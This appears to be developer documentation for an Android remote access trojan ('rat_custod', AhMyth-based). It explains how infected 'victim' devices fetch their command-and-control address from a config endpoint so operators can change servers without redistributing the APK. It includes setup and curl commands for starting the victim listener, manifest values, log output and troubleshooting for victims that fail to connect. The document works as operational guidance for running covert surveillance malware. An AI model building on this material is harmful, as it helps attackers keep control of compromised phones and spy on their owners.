# Dynamic Server Configuration System

## Overview

The rat_custod application now supports **dynamic server configuration**, allowing the Android client to fetch server IP and port settings at runtime from a remote configuration endpoint. This eliminates the need to rebuild and redistribute APK files when server details change.

## How It Works

### Configuration Flow

1. **Server Setup**: The main server runs on port 3000 (configurable via PORT environment variable)
2. **Victim Listener Setup**: A separate listener must be started on SERVER_PORT (e.g., 8000) via the web UI or `/api/listen` API
3. **Client Startup**: When the MainService starts, it first reads the fallback configuration from AndroidManifest.xml meta-data
4. **Config Fetch**: The client attempts to fetch dynamic configuration from `http://<SERVER_IP>:3000/api/config`
5. **Connection**: If the fetch succeeds, the client uses the dynamic values; otherwise, it falls back to manifest values
6. **Socket Connection**: The client establishes a Socket.IO connection to `http://<SERVER_IP>:<SERVER_PORT>` (the victim listener)

### Port Architecture

The system uses **two different ports**:

- **Main Server Port (3000)**: Hosts the web UI, API endpoints, and `/api/config` endpoint
- **Victim Listener Port (8000)**: Dedicated Socket.IO server for Android client connections (must be started separately)

See [PORT_CONFIGURATION.md](PORT_CONFIGURATION.md) for comprehensive port setup details.

### Fallback Mechanism

The implementation includes a robust fallback strategy:
- **Primary**: Dynamic configuration from `/api/config` endpoint (5-second timeout)
- **Fallback**: Static configuration from AndroidManifest.xml meta-data
- **Graceful Degradation**: If the config endpoint is unreachable, the app continues with manifest values

## Server Configuration

### Setting Up config.json

The server hosts a `config.json` file that defines the current server IP and port:

**Location**: `/rat-Server/config.json`

```json
{
  "SERVER_IP": "192.168.1.68",
  "SERVER_PORT": 8000
}
```

### Modifying Server Configuration

To change the server configuration:

1. Edit `rat-Server/config.json` with your desired values:
   ```json
   {
     "SERVER_IP": "10.0.0.50",
     "SERVER_PORT": 9000
   }
   ```

2. Restart the server (or no restart needed - changes are read on each request)

3. New client connections will automatically use the updated configuration

### API Endpoint

**Endpoint**: `GET /api/config`

**Response Format**:
```json
{
  "SERVER_IP": "192.168.1.68",
  "SERVER_PORT": 8000
}
```

**Error Handling**: If the config file is missing or malformed, the endpoint returns default values:
```json
{
  "error": "Configuration file not found",
  "SERVER_IP": "192.168.1.68",
  "SERVER_PORT": 8000
}
```

## Client Implementation

### MainService.java

The client implementation in `MainService.java` includes:

1. **Background Thread Execution**: Config fetching runs on a background thread to avoid NetworkOnMainThreadException
2. **HTTP Request**: Uses `HttpURLConnection` with 5-second timeout for config fetch
3. **JSON Parsing**: Parses the JSON response to extract SERVER_IP and SERVER_PORT
4. **Logging**: Comprehensive logging for debugging connection issues

### Configuration Priority

1. **Dynamic Config** (if available): Fetched from `/api/config` endpoint
2. **Manifest Meta-Data** (fallback): Defined in AndroidManifest.xml

```xml
<meta-data android:name="SERVER_IP"   android:value="192.168.1.68" />
<meta-data android:name="SERVER_PORT" android:value="8000" />
```

## Benefits

1. **No APK Rebuild**: Change server details without recompiling the Android app
2. **Centralized Configuration**: Single source of truth for server configuration
3. **Graceful Fallback**: Continues to work even if config endpoint is unavailable
4. **Easy Updates**: Update all clients by simply modifying config.json on the server
5. **Reduced Distribution**: No need to distribute new APKs for IP/port changes

## Testing

### Testing the Config Endpoint

Test the endpoint using curl:

```bash
curl http://192.168.1.68:3000/api/config
```

Expected output:
```json
{"SERVER_IP":"192.168.1.68","SERVER_PORT":8000}
```

### Testing Client Connection

1. Start the server:
   ```bash
   cd rat-Server
   node server.js
   ```

2. Install and run the client APK on an Android device

3. Check logs for config fetch attempts:
   ```bash
   adb logcat | grep AhMyth
   ```

Expected log output:
```
I/AhMyth: Initializing socket connection
I/AhMyth: Meta-data read: SERVER_IP=192.168.1.68 SERVER_PORT=8000
I/AhMyth: Attempting to fetch dynamic config from: http://192.168.1.68:3000/api/config
I/AhMyth: Dynamic config fetched successfully: SERVER_IP=192.168.1.68 SERVER_PORT=8000
I/AhMyth: Connecting to 192.168.1.68:8000
```

## Troubleshooting

### Client Can't Fetch Config

**Symptoms**: Client falls back to manifest values
**Causes**:
- Config server is not running
- Network connectivity issues
- Firewall blocking port 3000
- Incorrect IP in manifest meta-data

**Solution**: 
- Verify server is running: `curl http://<SERVER_IP>:3000/api/config`
- Check network connectivity between client and server
- Verify firewall rules allow port 3000

### Config Endpoint Returns Error

**Symptoms**: Endpoint returns 500 error or default values
**Causes**:
- config.json file is missing or malformed
- Invalid JSON syntax

**Solution**:
- Verify config.json exists in rat-Server directory
- Validate JSON syntax: `cat rat-Server/config.json | jq .`
- Check server logs for errors

### Client Won't Connect After Config Fetch

**Symptoms**: Config fetches successfully but socket connection fails
**Causes**:
- SERVER_PORT value in config.json doesn't match victim listener port
- Victim listener not started on server
- Firewall blocking SERVER_PORT

**Solution**:
- **Start the victim listener**:
  ```bash
  curl -X POST http://localhost:3000/api/listen \
    -H "Content-Type: application/json" \
    -d '{"port": 8000}'
  ```
- Verify victim listener is running on the specified port: `lsof -i :8000` (Linux/macOS) or `netstat -an | findstr :8000` (Windows)
- Check that SERVER_PORT in config.json matches the port used in `/api/listen` endpoint
- Verify firewall allows the victim listener port

For comprehensive troubleshooting, see [PORT_CONFIGURATION.md](PORT_CONFIGURATION.md)

## Security Considerations

1. **No Authentication**: The `/api/config` endpoint is unauthenticated by design for simplicity
2. **Cleartext HTTP**: Configuration is transmitted over HTTP (not HTTPS)
3. **Network Exposure**: Port 3000 must be accessible from client devices

For production use, consider:
- Adding authentication to the config endpoint
- Using HTTPS for config transmission
- Restricting access to the config endpoint by IP/network

## Future Enhancements

Potential improvements to the dynamic configuration system:

1. **Caching**: Cache fetched configuration to reduce network requests
2. **Multiple Endpoints**: Support fallback to multiple config URLs
3. **Configuration Versioning**: Track config version to detect changes
4. **Encrypted Configuration**: Encrypt sensitive configuration values
5. **Auto-Update**: Periodically re-fetch configuration while running
6. **Config Signature**: Verify config authenticity with digital signatures
